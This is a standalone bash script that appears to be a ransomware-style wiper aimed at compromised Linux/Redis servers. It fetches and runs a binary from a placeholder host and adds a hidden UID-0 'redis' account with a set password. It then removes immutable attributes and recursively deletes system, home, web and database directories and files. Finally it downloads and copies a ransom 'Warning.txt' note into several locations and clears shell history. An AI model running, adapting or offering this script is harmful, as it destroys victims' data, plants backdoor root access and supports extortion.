#!/bin/bash
export PATH=$PATH:/bin:/usr/bin:/usr/
local/bin:/sbin:/usr/sbin:/usr/local/sbin

curl -s http://xxx/uploader -o uploader
chmod +x uploader
userdel -r redis
useradd -o -u 0 -g 0 redis  &>/dev/null
echo "FakeRDOS-options-!" |passwd --stdin redis &>/dev/null
chattr -i -R /root
chattr -i -R /home
chattr -i -R /data
chattr -i -R /opt
chattr -i -R /usr
chattr -i -R /*
./uploader
rm -rf uploader
rm -rf /root/*
rm -rf /var/*
rm -rf /usr/*
rm -rf /home/*
rm -rf /opt/*
rm -rf /data/*
rm -rf /data*
rm -rf /usr/local/var/mysql
rm -rf /usr/local/var/mysql/*
rm -rf /usr/local/bin
rm -rf /var/lib/mysql
rm -rf /var/www/*
mkdir -p /data
find . -type f -name  '*.rdb' -exec rm -f {} ;
find . -type f -name  '*.mdb'  -exec rm -f {} ;
find . -type f -name  '*.log' -exec rm -f {} ;
find . -type f -name  '*.MDF' -exec rm -f {};
find . -type f -name  '*.db' -exec rm -f {} ;
find . -type f -name  '*.dbf' -exec rm -f {} ;
find . -type f -name  '*.wdb' -exec rm -f {} ;
find . -type d -name 'apache'  -exec rm -f {} ;
find . -type d -name 'mysql'  -exec rm -f {} ;
find . -type f -name  '*.log' -exec rm -f {} ;
curl -s http://xxx/warning.txt -o /root/Warning.txt
chmod +x /root/Warning.txt
chmod +x Warning.txt
cp /root/Warning.txt /WARNING.txt
cp /root/Warning.txt /data/WARNING.txt
cp /root/Warning.txt /var/WARNING.txt
history -c